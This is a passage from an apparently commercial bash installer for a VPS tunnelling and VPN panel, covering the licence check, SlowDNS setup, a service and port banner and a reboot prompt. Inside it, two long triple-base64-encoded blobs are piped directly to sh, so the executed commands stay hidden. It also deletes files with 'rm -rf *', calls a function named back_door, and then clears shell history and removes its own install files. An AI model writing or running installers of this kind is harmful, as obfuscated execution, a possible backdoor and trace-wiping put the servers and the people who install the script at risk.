export Hasil_Pengurangan_Dari_Masa_Aktif_Dan_Hari_Ini_Dalam_Satuan_Detik=$(( (Masa_Aktif_Dalam_Satuan_Detik - Tanggal_Sekarang_Dalam_Satuan_Detik) / 86400 ))
if [[ $Hasil_Pengurangan_Dari_Masa_Aktif_Dan_Hari_Ini_Dalam_Satuan_Detik -lt 0 ]]; then
echo -e "${EROR} Your License Expired On ( ${RED}$Masa_Laku_License_Berlaku_Sampai${NC} )"
exit 1
else
echo -e "${OKEY} Your License Key = $(if [[ ${Hasil_Pengurangan_Dari_Masa_Aktif_Dan_Hari_Ini_Dalam_Satuan_Detik} -lt 5 ]]; then
echo -e "${RED}${Hasil_Pengurangan_Dari_Masa_Aktif_Dan_Hari_Ini_Dalam_Satuan_Detik}${NC} Days Left"; else
echo -e "${GREEN}${Hasil_Pengurangan_Dari_Masa_Aktif_Dan_Hari_Ini_Dalam_Satuan_Detik}${NC} Days Left"; fi )"
fi
if [[ -r /usr/local/${Auther}/ ]]; then
echo -e ""
echo -e ""
echo -e "${INFO} Having Script Detected !"
echo -e "${INFO} If You Replacing Script, All Client Data On This Vps Will Be Cleanup !"
read -p "Are You Sure Wanna Replace Script ? (Y/N) " geogabut
if [[ $geogabut == "Y" ]]; then
echo -e "${INFO} Starting Replacing Script !"
elif [[ $geogabut == "y" ]]; then
echo -e "${INFO} Starting Replacing Script !"
elif [[ $geogabut == "N" ]]; then
echo -e "${INFO} Action Canceled !"
exit 1
elif [[ $geogabut == "n" ]]; then
echo -e "${INFO} Action Canceled !"
exit 1
else
echo -e "${EROR} Your Input Is Wrong !"
exit 1
fi
fi
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Starting Installation") "
echo ""
clear
function ins_slowdns() {
clear
cd
export NS_DOMAIN=$(cat /etc/xray/ns.txt)
rm -rf *
echo 'WWxkMGEyRllTV2RNV0VGblRESldNRmw1T1hwaVJ6a3pXa2MxZWtObmJETmFNbFl3U1VNeGVFbERNVkJKUjFKMVl6TlNNRXhZVG14amJscHNZMmxCYVVwSWRFaFNWVGxtVm14Q1QyWllUbk5pTTJSclltNU5kbHBITlhwa1NGRjBZekpXZVdSdFZubEphVUZ0U21sQ2FtRkhNWFphUTBGeVpVTkNhMkp1VGpCa1F6RjZXbGhLTWxwWVNXZFFhVGxyV2xoWmRtSnVWbk5pUTBGNVVHbFplRU5uYkROYU1sWXdTVU14ZUVsRE1WQkpSMUoxWXpOU01FeFhUbk5oVjFaMVpFTkJhVXBJZEVoU1ZUbG1WbXhDVDJaWVRuTmlNMlJyWW01TmRscEhOWHBrU0ZGMFdUSjRjRnBYTlRCSmFVRnRTbWxDYW1GSE1YWmFRMEZ5WlVOQ2EySnVUakJrUXpGcVlrZHNiR0p1VVdkUWFUbHJXbGhaZG1KdVZuTmlRMEY1VUdsWmVFTm5hM1ZNTWxKMVl6TlNNRXhZVG14amJscHNZMmxCZEZveVZuVk1WM1JzWlZOQmRHTklTbkJrYlhSc1pWTXhiV0ZYZUd4SlNFNXNZMjVhYkdOcE5YSmFXR3RuVEZoQ01WbHRkR3hsVXpGdFlWZDRiRWxJVG14amJscHNZMmsxZDJSWFNVdERWMDV2WWxjNWEwbERkRFJKUTI5TFExY3hNa2xEYjJkTU1sWXdXWGs1ZW1KSE9UTmFSelY2UTJkc00xb3lWakJKUXpGNFNVTXhVRWxET1d4a1IwMTJZek5zZW1SSFZuUmFRemw2WlZoT01GcFhNSFpaTW5od1dsYzFNRXh1VG14amJscHdXVEpWWjBscFVqZFNNRlpRV0RGYVVWUnVNWHBpUnpreldrYzFla3d5VG5OaFYxWjFaRU5KWjFCcE9XdGFXRmwyWW01V2MySkRRWGxRYVZsNFEyZHNNMW95VmpCSlF6RjRTVU14VUVsRE9XeGtSMDEyWXpOc2VtUkhWblJhUXpsNlpWaE9NRnBYTUhaak1sWjVaRzFXZVV4dVRteGpibHB3V1RKVlowbHBVamRTTUZaUVdERmFVVlJ1TVhwaVJ6a3pXa2MxZWt3elRteGpibHBzWTJsSloxQnBPV3RhV0ZsMlltNVdjMkpEUVhsUWFWbDQ=' | base64 -d | base64 -d | base64 -d | sh
sed -i "s/xxxx/$NS_DOMAIN/g" /etc/systemd/system/client.service
sed -i "s/xxxx/$NS_DOMAIN/g" /etc/systemd/system/server.service
#wget https://installer.us.kg/ssh/dropbear && mv dropbear /usr/sbin/dropbear && chmod +x /usr/sbin/dropbear && systemctl restart dropbear
iptables -I INPUT -p udp --dport 5300 -j ACCEPT
iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
iptables-save >/etc/iptables/rules.v4 >/dev/null 2>&1
iptables-save >/etc/iptables.up.rules >/dev/null 2>&1
echo 'WW0xV01GcHRiSE5rUjFaNVRGaENiR051VG5Cak0xSnNZbTVSWjJNeVJqSmFVMEVyVERKU2JHUnBPWFZrVjNoelNVUkpLMHBxUlV0aWJWWXdXbTFzYzJSSFZubE1XRUpzWTI1T2NHTXpVbXhpYmxGblkyMVdjMkl5Um10SlJEUjJXa2RXTWt3eU5URmlSM2RuVFdvMGJVMVJjSHBsV0U0d1dsY3hhbVJIZDJkYVZ6Vm9XVzE0YkVsSGJIZGtSMFpwWWtkV2VrbEVOSFphUjFZeVRESTFNV0pIZDJkTmFqUnRUVkZ3ZW1WWVRqQmFWekZxWkVkM1oyTXpVbWhqYmxGbllWaENNRmxYU25OYVdFMW5VR2s1YTFwWVdYWmlibFp6WWtOQmVWQnBXWGhEYms0MVl6TlNiR0pYVGpCaVEwSjVXbGhPTUZsWVNqQkpSMngzWkVkR2FXSkhWbnBKUkRSMldrZFdNa3d5TlRGaVIzZG5UV28wYlUxUmNIcGxXRTR3V2xjeGFtUkhkMmRhVnpWb1dXMTRiRWxIVG5OaFYxWjFaRUZ3ZW1WWVRqQmFWekZxWkVkM1oxcFhOV2haYlhoc1NVaE9iR051V214alozQjZaVmhPTUZwWE1XcGtSM2RuWXpOU2FHTnVVV2RaTW5od1dsYzFNRU51VGpWak0xSnNZbGRPTUdKRFFucGtSMFo1WkVOQ2VscFlTakphV0VsTFl6TnNlbVJIVm5SWk0xSnpTVWhLYkdNelVtaGpibEZuV1RKNGNGcFhOVEJEYms0MVl6TlNiR0pYVGpCaVEwSjVXbGhPTUZsWVNqQkpTRTVzWTI1YWJHTm5QVDA9' | base64 -d | base64 -d | base64 -d | sh
}
function Josssssssss(){
clear
ins_izin
first_setup
ins_nginx
base_package
#DDoS_Deflate
folder_xray
ins_domain
back_door
ins_xray
ssh
ins_dropbear
udp_mini
ssh_udp
ins_sshd
ins_openvpn
ins_open
ins_bbr
ins_epro
menu
profile
limit_xray
ins_swab
ins_rclone
ins_vnstat
ins_slowdns
ins_restart
}
Josssssssss
echo ""
history -c
rm -rf /root/menu
rm -rf /root/*.zip
rm -rf /root/*.sh
rm -rf /root/LICENSE
rm -rf /root/README.md
rm -rf /root/domain
rm -rf /root/perizinan
rm -rf /root/images
rm -rf /root/menu
rm -rf /root/menu.zip
rm -rf /root/ins-rclone.sh
rm -rf /root/rc_local
echo -e ""
SAMAWA
echo -e " ${BLUE}┌─────────────────────────────────────────────────────┐"
echo -e " ${BLUE}│${NC}       >>> Service & Port                            ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Open SSH                : 22                    ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - UDP SSH                 : 1-65535               ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Dropbear                : 443, 109, 143         ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Dropbear Websocket      : 443, 109              ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - SSH Websocket SSL       : 443                   ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - SSH Websocket           : 80                    ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - OpenVPN SSL             : 443                   ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - OpenVPN Websocket SSL   : 443                   ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - OpenVPN TCP             : 443, 1194             ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - OpenVPN UDP             : 2200                  ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Nginx Webserver         : 443, 80, 81           ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Haproxy Loadbalancer    : 443, 80               ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - DNS Server              : 443, 53               ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - DNS Client              : 443, 88               ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - XRAY (DNSTT/SLOWDNS)    : 443, 53               ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - XRAY Vmess TLS          : 443                   ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - XRAY Vmess gRPC         : 443                   ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - XRAY Vmess None TLS     : 80                    ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - XRAY Vless TLS          : 443                   ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - XRAY Vless gRPC         : 443                   ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - XRAY Vless None TLS     : 80                    ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Trojan gRPC             : 443                   ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Trojan WS               : 443                   ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Shadowsocks WS          : 443                   ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Shadowsocks gRPC        : 443                   ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}                                                     ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}      >>> Server Information & Other Features        ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Timezone                : Asia/Jakarta (GMT +7) ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Autoreboot On           : $AUTOREB:00 $TIME_DATE GMT +7        ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Auto Delete Expired Account                     ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Fully Automatic Script                          ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Vps Settings                                    ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Admin Control                                   ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Restore Data                                    ${BLUE}│${NC}"
echo -e " ${BLUE}│${NC}   - Full Orders For Various Services                ${BLUE}│${NC}"
echo -e " ${BLUE}└─────────────────────────────────────────────────────┘${NC}"
echo ""
echo ""
echo -e "${INFO} Silahkan Reboot VPS Anda Biar Tidak Terjadi Error !"
echo -e ""
read -p "Apakah Anda Yakin Melakukan Reboot ? ( Y / N ) " rebootin
echo ""
echo ""
if [[ $rebootin == "Y" ]]; then
clear
echo -e "${INFO} Rebooting !"
reboot
elif [[ $rebootin == "y" ]]; then
clear
echo -e "${INFO} Rebooting !"
reboot
elif [[ $rebootin == "N" ]]; then
echo -e "${INFO} Reboot Canceled !"
exit 1
elif [[ $rebootin == "n" ]]; then
echo -e "${INFO} Reboot Canceled !"
exit 1
else
echo -e "${EROR} Reboot Otomatis !"
reboot
fi
